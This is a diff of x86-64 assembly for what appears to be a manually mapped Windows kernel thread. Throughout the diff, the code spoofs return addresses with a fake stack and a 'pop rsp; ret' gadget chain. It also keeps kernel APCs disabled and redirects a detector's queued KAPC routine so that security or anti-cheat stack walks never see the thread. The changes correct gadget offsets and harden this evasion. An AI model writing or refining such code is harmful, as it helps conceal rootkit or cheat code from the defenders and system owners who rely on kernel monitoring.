@@ -179,10 +179,12 @@ PostboxCleanWait:
     andq $-16, %r11
     subq $8, %r11                   # fake RSP, 16-byte aligned
 
-    # Shadow-space-safe chain: target returns to `add rsp,0x28; ret`, which
-    # skips the target return slot and the 0x20-byte shadow space, then jumps
-    # to `pop rsp; ret`; the real RSP is at fake+0x38. A callee spilling its
-    # register arguments at fake+8..0x27 cannot corrupt the restore chain.
+    # Shadow-space-safe chain: the target returns with RSP = fake+8, then
+    # `add rsp,0x28; ret` lands on fake+0x30 and pops the `pop rsp; ret` slot
+    # there. That ret leaves RSP = fake+0x38, and pop rsp loads the real RSP
+    # from fake+0x38. The chain slot must be 0x30, not 0x28: the 0x28 add is
+    # applied after the target's return slot has already been popped. A callee
+    # spilling its register arguments at fake+8..0x27 cannot corrupt it.
     movq g_PostboxPopRspRetSkip(%rip), %r9
     testq %r9, %r9
     jz 2f
@@ -190,7 +192,7 @@ PostboxCleanWait:
     movq g_PostboxPopRspRet(%rip), %r9
     testq %r9, %r9
     jz 2f
-    movq %r9, 0x28(%r11)            # return chain = pop rsp; ret
+    movq %r9, 0x30(%r11)            # return chain = pop rsp; ret
     movq %r10, 0x38(%r11)           # pop rsp loads the real RSP
     movq %r11, %rsp
     jmp *%rax
@@ -229,7 +231,10 @@ PostboxThreadLoop:
     movq 0x00(%rbx), %r12
     movq 0x08(%rbx), %r13
 
-    # Keep kernel APCs out of the first mapped step.
+    # Keep kernel APCs disabled for the whole loop: both the mapped step and
+    # the mapped wait run with APCs off, so a detector APC stays queued instead
+    # of walking this stack. The neutralizer below redirects the detector's
+    # queued KAPC KernelRoutine before the region is left.
     movq 0x20(%rbx), %rax
     testq %rax, %rax
     jz 1f
@@ -240,37 +245,25 @@ PostboxThreadLoop:
     testl %eax, %eax
     jz 9f
 
-    # The step has returned, so its mapped frames are gone. Enable APCs only
-    # for the clean wait; the wait itself hides its mapped return address.
-    movq 0x28(%rbx), %rax
-    testq %rax, %rax
-    jz 2f
-    call *%rax
-2:
-    # Use the verified generic shadow-stack trampoline (PostboxSpoofCall3)
-    # instead of the custom clean-wait fake stack.
+    # Neutralize any detector APC queued during the step, then wait with APCs
+    # still disabled. The wait timer expires normally.
+    call PostboxNeutralizeDetectorApcs
     leaq 0x18(%rbx), %rcx
     call PostboxSpoofedThreadWait
-
-    # Back in mapped code: disable APCs before the next step.
-    movq 0x20(%rbx), %rax
-    testq %rax, %rax
-    jz 1b
-    call *%rax
     jmp 1b
 
 9:
-    # The loop enters a critical region before every step and only leaves it on
-    # the continue path. Balance it here: PspExitThread bugchecks 0x20 when the
-    # APC-disable count is nonzero (observed Arg1=0, Arg2=0xFFFF = -1, i.e. no
-    # APC at all, one unbalanced KeEnterCriticalRegion). Leaving the region also
-    # delivers any queued kernel APC before the thread terminates.
+    # Neutralize the last pending detector APC(s), then balance the critical
+    # region. Leaving delivers the patched APCs; the neutralizer frees each one
+    # without capturing this thread's mapped stack. The APC-disable count must
+    # reach zero or PspExitThread bugchecks 0x20 (Arg1=0, Arg2=0xFFFF).
+    call PostboxNeutralizeDetectorApcs
     movq 0x28(%rbx), %rax
     testq %rax, %rax
     jz 8f
     call *%rax
 8:
-    # Drain pending kernel APCs before this system thread exits.
+    # Drain any remaining (non-detector) kernel APCs before thread exit.
     call PostboxDrainThreadApcs
     addq $0x30, %rsp
     popq %r13
